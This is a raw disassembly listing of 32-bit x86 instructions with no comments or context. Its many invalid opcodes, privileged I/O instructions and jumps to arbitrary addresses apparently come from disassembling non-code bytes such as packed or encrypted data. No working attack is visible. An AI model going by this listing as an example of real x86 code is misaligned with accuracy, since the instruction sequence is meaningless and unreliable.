  40a5e6:	in     eax,0xe2
  40a5e8:	lahf   
  40a5e9:	mov    esp,0x5ed65f31
  40a5ee:	sbb    bl,BYTE PTR [edi]
  40a5f0:	sub    eax,0xfd961a10
  40a5f5:	in     eax,dx
  40a5f6:	mov    esp,0x172f2a46
  40a5fb:	xchg   ebx,eax
  40a5fc:	and    al,0x68
  40a5fe:	jae    0x40a5b3
  40a600:	ds (bad) 
  40a602:	mov    ecx,0xbd2bbdb
  40a607:	fidivr WORD PTR [eax-0x1]
  40a60a:	sti    
  40a60b:	pop    edi
  40a60c:	jnp    0x40a633
  40a60e:	mov    esp,0xb3c57d4e
  40a613:	mov    ebx,ds
  40a615:	add    al,0xb1
  40a617:	call   0x62c7b518
  40a61c:	pop    ebx
  40a61d:	mov    ds:0xf1f670f6,al
  40a622:	dec    ch
  40a624:	popf   
  40a625:	addr16 sub eax,0x86aa1dce
  40a62b:	fimul  DWORD PTR [edx-0x5a6239f3]
  40a631:	test   BYTE PTR [edx+ebp*1+0x6a],0x2f
  40a636:	xor    eax,0x22b85da4
  40a63b:	loop   0x40a619
  40a63d:	inc    ebp
  40a63e:	jg     0x40a626
  40a640:	inc    esi
  40a641:	je     0x40a5fa
  40a643:	inc    ebx
  40a644:	loop   0x40a5ed
  40a646:	scas   al,BYTE PTR es:[edi]
  40a647:	xchg   DWORD PTR [esi-0x4569b342],esp
  40a64d:	add    al,0x72
  40a64f:	jmp    0xa328:0x2eec4b9b
  40a656:	or     BYTE PTR [esi+0x1c],dh
  40a659:	test   BYTE PTR [ebx+0x40],al
  40a65c:	fucomp st(2)
  40a65e:	pusha  
  40a65f:	call   0xf806f66c
  40a664:	jno    0x40a604
  40a666:	xor    eax,0xa941be0b
  40a66b:	lea    edx,[eax-0x620407]
  40a671:	add    eax,0xa1bd8a8e
  40a676:	xor    al,0x90
  40a678:	icebp  
  40a679:	mov    al,fs:0xd6167841
  40a67f:	pop    ds
  40a680:	jmp    0x40a61f
  40a682:	mov    ch,0xc5
  40a684:	imul   ebp,DWORD PTR ds:0xbdfaf43a,0x3dc2e14e
  40a68e:	clc    
  40a68f:	mov    ch,0xd7
  40a691:	daa    
  40a692:	je     0x40a615
  40a694:	lea    edx,[ebx+0x72]
  40a697:	fisttp WORD PTR [eax+eax*1+0x4fc55a0e]
  40a69e:	jno    0x40a655
  40a6a0:	adc    BYTE PTR [eax+0x3c28e617],cl
  40a6a6:	sbb    ebx,edi
  40a6a8:	(bad)  
  40a6a9:	jl     0x40a630
  40a6ab:	jb     0x40a6b4
  40a6ad:	loop   0x40a63b
  40a6af:	fisub  WORD PTR [ebx+ebx*1]
  40a6b2:	cmc    
  40a6b3:	lods   eax,DWORD PTR ds:[esi]
  40a6b4:	adc    al,0x5e
  40a6b6:	xchg   esp,ecx
  40a6b8:	adc    DWORD PTR [edi+0x953dfde],edx
  40a6be:	aad    0x56
  40a6c0:	clc    
  40a6c1:	pop    ebp
  40a6c2:	es xchg edx,eax
  40a6c4:	(bad)  
  40a6c5:	jecxz  0x40a6a8
  40a6c7:	or     al,0x9c
  40a6ca:	sar    BYTE PTR ds:0x3b22944f,cl
  40a6d0:	dec    ebp
  40a6d1:	loope  0x40a738
  40a6d3:	je     0x40a6fe
  40a6d5:	retf   
  40a6d6:	clc    
  40a6d7:	cmp    BYTE PTR ds:[esi-0x59ad1167],ah
  40a6de:	inc    ecx
  40a6df:	fwait
  40a6e0:	stos   BYTE PTR es:[edi],al
  40a6e1:	xor    ebx,DWORD PTR [edx]
  40a6e3:	aaa    
  40a6e4:	xor    DWORD PTR [eax+0x56],0xffffffc2
  40a6e8:	jl     0x40a687
  40a6ea:	iret   
  40a6eb:	and    ebx,DWORD PTR [edi-0x2df485ae]
  40a6f1:	jo     0x40a765
  40a6f3:	iret   
  40a6f4:	mov    dl,0x73
  40a6f6:	not    DWORD PTR [edx-0x2f34dd93]
  40a6fc:	sti    
  40a6fd:	dec    esi
  40a6fe:	es das 
  40a700:	push   0xffffffa8
  40a702:	aas    
  40a703:	xchg   ebx,eax
  40a704:	fadd   QWORD PTR [ebp-0x6d]
  40a707:	xor    ah,ch
  40a709:	push   ss
  40a70a:	dec    esp
  40a70b:	lods   al,BYTE PTR ds:[esi]
  40a70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a70d:	fmul   DWORD PTR fs:[ebp-0x747258d7]
  40a714:	and    BYTE PTR fs:[ecx-0x3beff8b3],ah
  40a71b:	test   al,0xe
  40a71d:	push   cs
  40a71e:	add    DWORD PTR [ecx-0x13],ecx
  40a721:	nop
  40a722:	imul   ecx,DWORD PTR [ebp+0xd79cca1],0x52
  40a729:	or     eax,0x816ffa1
  40a72e:	test   BYTE PTR [esi],dh
  40a730:	sbb    bh,bh
  40a732:	dec    edx
  40a733:	and    dl,cl
  40a735:	cmovge ecx,esi
  40a738:	and    eax,0xf7fa53c3
  40a73d:	test   eax,0x8a4c0b2e
  40a742:	ja     0x40a73e
  40a744:	push   ds
  40a745:	push   esi
  40a746:	ja     0x40a773
  40a748:	addr16 push ecx
  40a74a:	inc    ecx
  40a74b:	add    al,0x8b
  40a74d:	pop    edx
  40a74e:	test   DWORD PTR [esp+ecx*4-0x7d],ebp
  40a752:	sbb    BYTE PTR [ecx],dh
  40a754:	int3   
  40a755:	lahf   
  40a756:	lock adc al,0x67
  40a759:	loopne 0x40a780
  40a75b:	dec    ebx
  40a75c:	in     al,0x29
  40a75e:	mov    ch,0x57
  40a760:	sub    al,0x9f
  40a762:	cmp    ch,ch
  40a764:	leave  
  40a765:	int3   
  40a766:	fs out 0xae,eax
  40a769:	push   cs
  40a76a:	push   cs
  40a76b:	cli    
  40a76c:	dec    edx
  40a76d:	and    esp,DWORD PTR [ebx*4-0x21e6b658]
  40a774:	in     eax,0xa6
  40a776:	adc    al,0x13
  40a778:	int    0x7c
  40a77a:	xor    al,0x7f
  40a77c:	pop    esi
  40a77d:	gs or  eax,0x16d41b44
  40a783:	fld    st(6)
  40a785:	add    BYTE PTR [edx],bh
  40a787:	xor    eax,0xacd1f375
  40a78c:	push   ebp
  40a78d:	push   edx
  40a78e:	cli    
  40a78f:	xchg   ebx,eax
  40a790:	loope  0x40a7e3
  40a792:	sbb    bh,BYTE PTR [esi+0x659f5c01]
  40a798:	cmp    ecx,ecx
  40a79a:	add    BYTE PTR [ebp+0x1a],cl
  40a79d:	add    DWORD PTR [ecx+0x34],ecx
  40a7a0:	sub    eax,0xd886906
  40a7a5:	lds    ebx,FWORD PTR [eax-0x29]
  40a7a8:	jbe    0x40a74e
  40a7aa:	mov    dh,0x53
  40a7ac:	pop    esi
  40a7ad:	js     0x40a790
  40a7af:	mov    dh,0x4a
  40a7b1:	retf   0x594c
  40a7b4:	mov    ebp,0x4bdccdd1
  40a7b9:	mov    ch,0xb8
  40a7bb:	sbb    BYTE PTR [eax+0x60e4cf51],al
  40a7c1:	je     0x40a7f3
  40a7c3:	and    BYTE PTR [edx-0x48],bl
  40a7c6:	dec    ebp
  40a7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7c8:	(bad)  
  40a7c9:	pop    ebp
  40a7ca:	(bad)  
  40a7cb:	mov    esp,0x168ec48d
  40a7d0:	out    dx,eax
  40a7d1:	fadd   QWORD PTR [esi+0x4bcfc2cb]
  40a7d7:	cwde   
  40a7d8:	jmp    0xba86d12a
  40a7dd:	int3   
  40a7de:	ror    DWORD PTR [esi+0x2a062916],0x3b
  40a7e5:	xchg   edi,eax
  40a7e6:	fs push ds
  40a7e8:	dec    esp
  40a7e9:	iret   
  40a7ea:	lock mov dh,0x6c
  40a7ed:	stc    
  40a7ee:	mov    edx,0xc9469136
  40a7f3:	jge    0x40a839
  40a7f5:	and    esp,esp
  40a7f7:	test   al,0x41
  40a7f9:	sar    BYTE PTR [edx+0x5f],cl
  40a7fc:	and    edi,DWORD PTR [edx-0x12cfd1a7]
  40a802:	mov    edi,0x6680f5bb
  40a807:	mov    ds:0xa6a90945,eax
  40a80c:	jo     0x40a873
  40a80e:	jo     0x40a877
  40a810:	xor    DWORD PTR ds:0x14741d96,edi
  40a816:	ins    BYTE PTR es:[edi],dx
  40a817:	mov    esi,0xed48d0f9
  40a81c:	jb     0x40a888
  40a81e:	xor    eax,0x567f70a8
  40a823:	enter  0x9266,0x78
  40a827:	stos   BYTE PTR es:[edi],al
  40a828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a829:	xchg   ebx,eax
  40a82a:	sbb    BYTE PTR [ecx-0x62414d0],cl
  40a830:	adc    BYTE PTR [edi],0xc2
  40a833:	fstp   DWORD PTR [ebx+eax*8]
  40a836:	pop    es
  40a837:	cmc    
  40a838:	and    eax,0xdc31c036
  40a83d:	mov    DWORD PTR [eax],edi
  40a83f:	add    DWORD PTR [ebx-0x1],eax
  40a842:	ins    DWORD PTR es:[edi],dx
  40a843:	fbld   TBYTE PTR [ecx-0x8]
  40a846:	fwait
  40a847:	inc    eax
  40a848:	cmc    
  40a849:	data16 fisub DWORD PTR [edx]
  40a84c:	mov    dh,0x87
  40a84e:	mov    eax,0x5d15dac
  40a853:	outs   dx,BYTE PTR ds:[esi]
  40a854:	mov    ah,0xff
  40a856:	push   ecx
  40a857:	pop    edi
  40a858:	popf   
  40a859:	pop    ss
  40a85a:	sub    BYTE PTR [ecx],0x20
  40a85d:	test   BYTE PTR [edx+0x68],cl
  40a860:	mov    WORD PTR [eax],ss
  40a862:	jnp    0x40a844
  40a864:	push   0x700f17ea
  40a869:	push   ebx
  40a86a:	mov    ebp,0x6c0a8996
  40a86f:	mov    esp,0xf4cb4b4b
  40a874:	xor    BYTE PTR [edi+edx*2-0x4fe77af8],dh
  40a87b:	xchg   ebx,edx
  40a87d:	daa    
  40a87e:	add    ah,bl
  40a880:	xlat   BYTE PTR ds:[ebx]
  40a881:	sbb    eax,0x11709360
  40a886:	addr16 jae 0x40a8e6
  40a889:	cs (bad) 
  40a88b:	in     al,dx
  40a88c:	mov    es,WORD PTR [eax+ebx*1+0x6e]
  40a890:	and    al,0x49
  40a892:	mov    edi,0x28bdd524
  40a897:	data16 ss jo 0x40a895
  40a89b:	aas    
  40a89c:	sub    dh,0xdf
  40a89f:	jl     0x40a8b3
  40a8a1:	mov    al,0x1c
  40a8a3:	call   0xb970:0xc4fac630
  40a8aa:	pop    ss
  40a8ab:	stos   DWORD PTR es:[edi],eax
  40a8ac:	push   es
  40a8ad:	jle    0x40a8e7
  40a8af:	test   BYTE PTR [eax-0x3d70df2],ch
  40a8b5:	sub    ebx,ecx
  40a8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8b8:	ror    DWORD PTR [edi-0x3daaff85],1
  40a8be:	aad    0xc2
  40a8c0:	xchg   esp,eax
  40a8c1:	loop   0x40a862
  40a8c3:	pop    ss
  40a8c4:	mov    ebp,0xe43a340c
  40a8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ca:	fwait
  40a8cb:	mov    BYTE PTR [ebx+0x58767b51],bl
  40a8d1:	cmp    al,0xa7
  40a8d3:	cdq    
  40a8d4:	push   esi
  40a8d5:	jo     0x40a89e
  40a8d7:	mov    esi,0xd8871ebc
  40a8dc:	repz (bad) 
  40a8de:	cdq    
  40a8df:	jo     0x40a91d
  40a8e1:	jnp    0x40a8af
  40a8e3:	lods   al,BYTE PTR ds:[esi]
  40a8e4:	push   esp
  40a8e5:	and    eax,0x65586b66
  40a8ea:	mov    DWORD PTR [ebp-0x5e],edx
  40a8ed:	cmp    ebx,edx
  40a8ef:	mov    al,0xab
  40a8f1:	in     eax,0x97
  40a8f3:	mov    eax,0x324b4d9c
  40a8f8:	stos   DWORD PTR es:[edi],eax
  40a8f9:	xchg   BYTE PTR ds:0x1070f68a,bl
  40a8ff:	adc    BYTE PTR [eax-0x2c7ef5ae],ch
  40a905:	fsubr  st,st(7)
  40a907:	loop   0x40a8cd
  40a909:	pushw  0x16
  40a90c:	pop    esi
  40a90d:	inc    esp
  40a90e:	not    edi
  40a910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a911:	test   DWORD PTR [eax],edx
  40a913:	aas    
  40a914:	idiv   DWORD PTR es:[eax-0x35fdb058]
  40a91b:	lods   eax,DWORD PTR ds:[esi]
  40a91c:	ins    BYTE PTR es:[edi],dx
  40a91d:	das    
  40a91e:	and    BYTE PTR [eax],dl
  40a920:	xchg   edx,eax
  40a921:	ror    BYTE PTR [esi+eiz*4+0x1be3c799],1
  40a928:	ins    DWORD PTR es:[edi],dx
  40a929:	fst    DWORD PTR [edx]
  40a92b:	mov    dl,0x72
  40a92d:	shl    BYTE PTR [edx+0x46],1
  40a930:	outs   dx,DWORD PTR ds:[esi]
  40a931:	sbb    eax,0x12491688
  40a936:	fwait
  40a937:	out    dx,eax
  40a938:	adc    eax,0xa5b80bb1
  40a93d:	sti    
  40a93e:	sti    
  40a93f:	cdq    
  40a940:	sub    esi,ecx
  40a942:	les    ebx,FWORD PTR ds:[edi-0x11]
  40a946:	xor    BYTE PTR [edi+0x347a2459],ch
  40a94c:	js     0x40a9c6
  40a94e:	jns    0x40a967
  40a950:	out    0x84,al
  40a952:	pop    ss
  40a953:	das    
  40a954:	mov    ds:0x261e0738,eax
  40a959:	scas   eax,DWORD PTR es:[edi]
  40a95a:	call   0x763e:0xcc52a152
  40a961:	outs   dx,BYTE PTR ds:[esi]
  40a962:	fnsave [ebx-0x53]
  40a965:	and    esp,DWORD PTR [edi+0x9d5cd24]
  40a96b:	icebp  
  40a96c:	adc    esi,DWORD PTR [ebx+eiz*1]
  40a96f:	call   0x7e665dac
  40a974:	cmc    
  40a975:	rcl    edx,cl
  40a977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a978:	in     eax,0xf
  40a97a:	enter  0x4e76,0xce
  40a97e:	sub    al,0x75
  40a980:	and    edi,edi
  40a982:	outs   dx,BYTE PTR ds:[esi]
  40a983:	popf   
  40a984:	push   ds
  40a985:	jns    0x40a9b0
  40a987:	mov    eax,DWORD PTR [esi+0x2ff86740]
  40a98d:	inc    esi
  40a98e:	add    ah,BYTE PTR [ebx-0x31]
  40a991:	lahf   
  40a992:	mov    esp,DWORD PTR [edx]
  40a994:	aaa    
  40a995:	lahf   
  40a996:	(bad)  [edx-0x18e72b15]
  40a99c:	mov    ah,0xcd
  40a99e:	shl    DWORD PTR [edx+edi*1+0x7b],cl
  40a9a2:	mov    al,0x43
  40a9a4:	fs pop fs
  40a9a7:	or     DWORD PTR [edi-0x6298c59f],esp
  40a9ad:	in     al,dx
  40a9ae:	fwait
  40a9af:	cs das 
  40a9b1:	fwait
  40a9b2:	add    al,0x8e
  40a9b4:	pop    ss
  40a9b5:	(bad)  
  40a9b6:	fld    TBYTE PTR [edx]
  40a9b8:	jns    0x40a99a
  40a9ba:	mov    ebx,0x1da4a7d5
  40a9bf:	and    bh,BYTE PTR [ebp+0x5f17a133]
  40a9c5:	fnstcw WORD PTR [edi+0x2f]
  40a9c8:	or     DWORD PTR [eax],ebp
  40a9ca:	sar    DWORD PTR [edx+0x13a8510],cl
  40a9d0:	mov    bl,0xd3
  40a9d2:	(bad)  
  40a9d3:	jne    0x40a99c
  40a9d5:	push   esi
  40a9d6:	inc    ecx
  40a9d7:	cdq    
  40a9d8:	cmc    
  40a9d9:	shr    DWORD PTR [edi-0x9],0xda
  40a9dd:	(bad)  
  40a9de:	fxch   st(5)
  40a9e0:	xlat   BYTE PTR ds:[ebx]
  40a9e1:	ret    
  40a9e2:	inc    esi
  40a9e3:	mov    esp,0x576af203
  40a9e8:	fdiv   st,st(4)
  40a9ea:	lahf   
  40a9eb:	inc    esp
  40a9ec:	aaa    
  40a9ed:	repz mov WORD PTR [edi+0x34],ds
  40a9f1:	cdq    
  40a9f2:	cmp    edi,DWORD PTR [ebx+0x6480e6e7]
  40a9f8:	shr    BYTE PTR [esi-0x601257b5],cl
  40a9fe:	and    edx,ebp
  40aa00:	add    al,0x37
  40aa02:	mov    ebx,cs
  40aa04:	dec    ebp
  40aa05:	jecxz  0x40a9a8
  40aa07:	mov    ch,BYTE PTR [edx]
  40aa09:	test   BYTE PTR [ebx+eiz*8+0x4c],dl
  40aa0d:	and    BYTE PTR ds:0xaae7f544,bh
  40aa13:	and    DWORD PTR [ecx+eax*1-0x2caeb7a0],edx
  40aa1a:	cld    
  40aa1b:	cwde   
  40aa1c:	in     al,0xcf
  40aa1e:	in     eax,0xe7
  40aa20:	mov    ah,0x5b
  40aa22:	xchg   ebx,eax
  40aa23:	or     eax,0x83eeec0b
  40aa28:	in     eax,dx
  40aa29:	(bad)  
  40aa2a:	fistp  QWORD PTR [eax+edi*2]
  40aa2d:	arpl   WORD PTR [ebx],dx
  40aa2f:	mov    dh,0x82
  40aa31:	popa   
  40aa32:	daa    
  40aa33:	adc    al,bl
  40aa35:	fild   WORD PTR [ebp+edx*8-0x64f77d37]
  40aa3c:	sti    
  40aa3d:	and    al,al
  40aa3f:	loope  0x40aaaf
  40aa41:	fisub  WORD PTR [edx+0x6e31f91d]
  40aa47:	jmp    0x2f43ba7a
  40aa4c:	xchg   ebp,eax
  40aa4d:	pop    eax
  40aa4e:	inc    edx
  40aa4f:	or     al,0x8
  40aa51:	adc    edi,DWORD PTR [edi+0x44]
  40aa54:	mov    ds:0x2c500ad,eax
  40aa59:	add    eax,0xc5d16cf5
  40aa5e:	inc    esp
  40aa5f:	dec    edi
  40aa60:	mov    DWORD PTR [edi+edi*2+0xa],edx
  40aa64:	pop    ecx
  40aa65:	adc    DWORD PTR ds:0xd27f6806,ebx
  40aa6b:	push   esp
  40aa6c:	xchg   edi,eax
  40aa6d:	mov    ebx,0x65f9878c
  40aa72:	leave  
  40aa73:	shl    DWORD PTR [ebp-0x72a12b5],cl
  40aa79:	pop    ss
  40aa7a:	xchg   DWORD PTR [edi+0x3e],ebx
  40aa7d:	fild   QWORD PTR [edx]
  40aa7f:	fwait
  40aa80:	xchg   esp,eax
  40aa81:	test   eax,0x29952d09
  40aa86:	lea    ebx,[eax+edx*1+0x357723ac]
  40aa8d:	pop    ebx
  40aa8e:	sbb    BYTE PTR [edx+0x50c149f4],bl
  40aa94:	jb     0x40aafe
  40aa96:	adc    al,BYTE PTR [edi]
  40aa98:	xor    al,0x5a
  40aa9a:	icebp  
  40aa9b:	xchg   DWORD PTR [ebx-0xc76bf27],esi
  40aaa1:	test   eax,0x7aedd3ca
  40aaa6:	add    BYTE PTR [esi+0x1a],bh
  40aaa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaaa:	pusha  
  40aaab:	cmc    
  40aaac:	cmp    DWORD PTR [eax+0x2f8a636f],eax
  40aab2:	or     al,0x38
  40aab4:	mov    dh,0x3e
  40aab6:	pop    eax
  40aab7:	jns    0x40aa4a
  40aab9:	push   edx
  40aaba:	and    dl,BYTE PTR [eax+0x71]
  40aabd:	rol    BYTE PTR [ebx],0xcc
  40aac0:	(bad)  
  40aac1:	clc    
  40aac2:	pop    ebp
  40aac3:	out    0x3b,eax
  40aac5:	retf   0x7b54
  40aac8:	mov    WORD PTR [eax+0x727c7c56],gs
  40aace:	daa    
  40aacf:	jne    0x40ab40
  40aad1:	and    ah,BYTE PTR [ebp+0x52]
  40aad4:	mov    dh,bh
  40aad6:	adc    eax,0x356374ad
  40aadb:	bound  eax,QWORD PTR [edx+ebx*4+0x420b62e8]
  40aae2:	fnsave [ebp+edi*4+0x3948950f]
  40aae9:	add    esp,eax
  40aaeb:	gs repz popa 
  40aaee:	sub    al,0x35
  40aaf0:	in     eax,0x10
  40aaf2:	fwait
  40aaf3:	dec    edx
  40aaf4:	lods   al,BYTE PTR ds:[esi]
  40aaf5:	imul   BYTE PTR [esp+eiz*4-0x6e]
  40aaf9:	retf   0xf543
  40aafc:	xor    BYTE PTR [eax-0x20282531],bl
  40ab02:	mov    BYTE PTR [ebx+eiz*1],0x7b
  40ab06:	add    ah,BYTE PTR [ebp+0x32]
  40ab09:	cmp    al,BYTE PTR [edi-0x7a485cd2]
  40ab0f:	imul   ebp,esi,0xffffff80
  40ab12:	jbe    0x40ab5d
  40ab14:	dec    esp
  40ab15:	imul   ecx,esi,0x1b377eca
  40ab1b:	shl    ecx,cl
  40ab1d:	adc    ecx,DWORD PTR [ecx]
  40ab1f:	xchg   ebx,eax
  40ab20:	clc    
  40ab21:	inc    ebx
  40ab22:	sar    DWORD PTR [ebp+0x1cd20108],cl
  40ab28:	push   ecx
  40ab29:	push   edx
  40ab2a:	sub    BYTE PTR [eax-0x1de1fb29],0x41
  40ab31:	test   BYTE PTR ds:0x2b7f4d1f,bl
  40ab37:	sar    BYTE PTR [esp+edx*2],cl
  40ab3a:	in     eax,0xee
  40ab3c:	inc    ecx
  40ab3d:	pop    ds
  40ab3e:	mov    ch,0x7d
  40ab40:	cdq    
  40ab41:	arpl   WORD PTR [ebx],bx
  40ab43:	sbb    al,0x9f
  40ab45:	fnsave [ebx-0x443d2304]
  40ab4b:	int    0xe0
  40ab4d:	ret    0xd5a9
  40ab50:	xor    ah,BYTE PTR [edx+0x2cf6bb0d]
  40ab56:	fisttp DWORD PTR [edx-0x60bd101f]
  40ab5c:	add    BYTE PTR [esi-0x7f8a8a18],bl
  40ab62:	ins    DWORD PTR es:[edi],dx
  40ab63:	xor    bl,bl
  40ab65:	dec    esp
  40ab66:	pop    es
  40ab67:	mov    ds:0x7f1420fc,al
  40ab6c:	dec    edx
  40ab6d:	cmp    DWORD PTR [eiz*1+0x203b1507],esi
  40ab74:	xor    eax,0x1bed0d04
  40ab79:	mov    cl,0xfc
  40ab7b:	cmp    eax,0x17672875
  40ab80:	fsub   st,st(3)
  40ab82:	push   0x1d3c5d18
  40ab87:	adc    eax,0xe964243f
  40ab8c:	ret    0x689e
  40ab8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab90:	jmp    0x3e00b298
  40ab95:	inc    esp
  40ab96:	sub    BYTE PTR [edx+0x40bf38b5],bh
  40ab9c:	rol    DWORD PTR [esi+ebx*4-0xaf33fe1],0x69
  40aba4:	aas    
  40aba5:	ins    BYTE PTR es:[edi],dx
  40aba6:	pop    eax
  40aba7:	jno    0x40ab38
  40aba9:	fisttp QWORD PTR [edi-0x10]
  40abac:	jno    0x40ab6f
  40abae:	(bad)  [ebx]
  40abb0:	rcr    esp,1
  40abb2:	icebp  
  40abb3:	or     bl,bl
  40abb5:	cmc    
  40abb6:	mov    ebp,0x16f985c9
  40abbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abbc:	mov    ds:0xda72ff62,eax
  40abc1:	pop    esp
  40abc2:	nop
  40abc3:	sbb    BYTE PTR [ebp-0x1f],0x8c
  40abc7:	xchg   ebx,eax
  40abc8:	test   BYTE PTR [eax],dh
  40abca:	mov    ch,ah
  40abcc:	cmp    ebp,esi
  40abce:	pop    es
  40abcf:	call   0x2eb59fdc
  40abd4:	push   cs
  40abd5:	xchg   BYTE PTR [ecx],bl
  40abd7:	cdq    
  40abd8:	adc    BYTE PTR [ebx+eiz*8+0x5f],0x55
  40abdd:	rcr    DWORD PTR [edi],cl
  40abdf:	ror    BYTE PTR [eax+0x646691a0],1
  40abe5:	inc    ebx
  40abe6:	adc    bh,BYTE PTR [edi+ebx*2+0x52c6cb8d]
  40abed:	loopne 0x40abc4
  40abef:	or     DWORD PTR [edi-0x4cc580cf],ebp
  40abf5:	inc    esp
  40abf6:	pop    eax
  40abf7:	out    dx,eax
  40abf8:	mov    edi,0xf6a5c315
  40abfd:	jmp    0x40ac4c
  40abff:	dec    edx
  40ac00:	test   eax,0xc22b814d
  40ac05:	ja     0x40ac44
  40ac07:	mov    ebp,0xf07456d9
  40ac0c:	fidivr DWORD PTR [edx+0x459f818b]
  40ac12:	push   edi
  40ac13:	test   al,0x69
  40ac15:	in     al,dx
  40ac16:	dec    edi
  40ac17:	dec    ecx
  40ac18:	mov    WORD PTR [ebp+0x1226ae10],es
  40ac1e:	cwde   
  40ac1f:	jl     0x40ac55
  40ac21:	imul   eax,DWORD PTR [ecx-0x3f807098],0x32
  40ac28:	(bad)  
  40ac29:	jne    0x40ac3e
  40ac2b:	das    
  40ac2c:	jne    0x40ac6f
  40ac2e:	(bad)  
  40ac2f:	int3   
  40ac30:	fs repnz hlt 
  40ac33:	pop    esp
  40ac34:	sbb    eax,0x3b59e975
  40ac39:	adc    esp,edx
  40ac3b:	fcmovu st,st(5)
  40ac3d:	xor    DWORD PTR [edx+0x25],0xb511731d
  40ac44:	xlat   BYTE PTR ds:[ebx]
  40ac45:	sbb    BYTE PTR [ecx-0x10],dh
  40ac48:	mov    dh,0x22
  40ac4a:	mov    ds:0xc7804cca,al
  40ac4f:	and    cl,BYTE PTR ds:0x6b7789ba
  40ac55:	loope  0x40abda
  40ac57:	jecxz  0x40abdc
  40ac59:	std    
  40ac5a:	xlat   BYTE PTR ds:[ebx]
  40ac5b:	dec    eax
  40ac5c:	shl    DWORD PTR [esi],cl
  40ac5e:	or     bp,WORD PTR [ebp+0x6fe3d6c5]
  40ac65:	fidiv  WORD PTR [ecx+ecx*2-0xaef4216]
  40ac6c:	add    ch,BYTE PTR [ebx+0x46]
  40ac6f:	dec    bp
  40ac71:	push   eax
  40ac72:	ror    BYTE PTR [esi+0x560ed20f],0x5c
  40ac79:	fstp   DWORD PTR [ecx]
  40ac7b:	jge    0x40acf7
  40ac7d:	aas    
  40ac7e:	lods   eax,DWORD PTR ds:[esi]
  40ac7f:	dec    esp
  40ac80:	(bad)  
  40ac81:	or     al,0xec
  40ac83:	dec    ebp
  40ac84:	loop   0x40ac72
  40ac86:	sbb    DWORD PTR [ebp+0x2c6ec588],eax
  40ac8c:	pop    ss
  40ac8d:	mov    edi,0xe0ffe3d
  40ac92:	xchg   ebp,eax
  40ac93:	dec    ebx
  40ac94:	xchg   DWORD PTR [edx-0x59663f72],edx
  40ac9a:	(bad)  
  40ac9b:	lods   al,BYTE PTR ds:[esi]
  40ac9c:	or     ah,BYTE PTR [eax]
  40ac9e:	cmp    eax,0x5805ec36
  40aca3:	fiadd  WORD PTR [ecx-0x12]
  40aca6:	sub    BYTE PTR [ebx],bl
  40aca8:	arpl   WORD PTR [edi],sp
  40acaa:	pop    ebx
  40acab:	fistp  DWORD PTR [eax+esi*4-0x3034f0d8]
  40acb2:	sbb    eax,0x6f11a1cd
  40acb7:	jle    0x40ace8
  40acb9:	inc    eax
  40acba:	pop    es
  40acbb:	(bad)  
  40acbc:	cs pushf 
  40acbe:	ins    DWORD PTR es:[edi],dx
  40acbf:	xor    cl,dl
  40acc1:	inc    ecx
  40acc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acc3:	mov    dl,0x9e
  40acc5:	push   0x4d
  40acc7:	hlt    
  40acc8:	(bad)
  40accb:	adc    BYTE PTR [edi-0x5f],0x2a
  40accf:	mov    ebx,0xa3c39cc2
  40acd4:	jo     0x40ad1d
  40acd6:	and    al,0xdb
  40acd8:	mov    esi,0x26c4da24
  40acdd:	sub    al,0xc4
  40acdf:	cli    
  40ace0:	add    DWORD PTR [ebp-0x3df439f3],eax
  40ace6:	push   ds
  40ace7:	mov    dl,BYTE PTR [eax-0x5b]
  40acea:	scas   al,BYTE PTR es:[edi]
  40aceb:	icebp  
  40acec:	sti    
  40aced:	xor    al,0x17
  40acef:	and    ah,BYTE PTR [ebx+0x6f]
  40acf2:	jle    0x40ace1
  40acf4:	rcl    DWORD PTR [eax-0x6831b3b3],cl
  40acfa:	dec    ecx
  40acfb:	inc    esi
  40acfc:	stos   BYTE PTR es:[edi],al
  40acfd:	push   esp
  40acfe:	xor    ecx,DWORD PTR [edx]
  40ad00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad01:	pusha  
  40ad02:	xchg   DWORD PTR [esi+edi*2-0x78],ebx
  40ad06:	retf   
  40ad07:	loope  0x40ad82
  40ad09:	jne    0x40acf2
  40ad0b:	adc    ebx,DWORD PTR [esi]
  40ad0d:	mov    gs,edx
  40ad0f:	ss stc 
  40ad11:	xor    BYTE PTR [edx],0x9
  40ad14:	xchg   esi,eax
  40ad15:	bound  edi,QWORD PTR [ebp+ebp*4+0x63]
  40ad19:	iret   
  40ad1a:	cmp    DWORD PTR [edi+0x1c1569da],ebx
  40ad20:	push   edx
  40ad21:	sub    eax,0x4d5294ff
  40ad26:	pushf  
  40ad27:	ds or  ebp,0x44
  40ad2b:	inc    edx
  40ad2c:	data16 xor BYTE PTR [edx+0x31],al
  40ad30:	xchg   ebx,eax
  40ad31:	adc    bh,BYTE PTR [ebx-0x2ce52b30]
  40ad37:	push   ecx
  40ad38:	add    DWORD PTR [esi+0x7e],eax
  40ad3b:	mov    esi,0x9d42e679
  40ad40:	inc    ecx
  40ad41:	int    0x4a
  40ad43:	daa    
  40ad44:	in     eax,dx
  40ad45:	jmp    0x8fc3:0x8e55c0cb
  40ad4c:	rcr    bl,cl
  40ad4e:	pushf  
  40ad4f:	xchg   edi,ebp
  40ad51:	and    BYTE PTR [edi-0x708079c2],ah
  40ad57:	test   BYTE PTR [edx-0x37],cl
  40ad5a:	inc    ebp
  40ad5b:	push   es
  40ad5c:	pop    esp
  40ad5d:	jb     0x40adc6
  40ad5f:	loop   0x40add8
  40ad61:	xor    dh,BYTE PTR [edx+0x670a34fd]
  40ad67:	cmp    dh,BYTE PTR [ebx+edi*2+0x12]
  40ad6b:	neg    DWORD PTR [esi-0x5d]
  40ad6e:	xor    dl,ch
  40ad70:	inc    eax
  40ad71:	jne    0x40ad0c
  40ad73:	push   cs
  40ad74:	in     eax,dx
  40ad75:	ret    
  40ad76:	cs pop ds
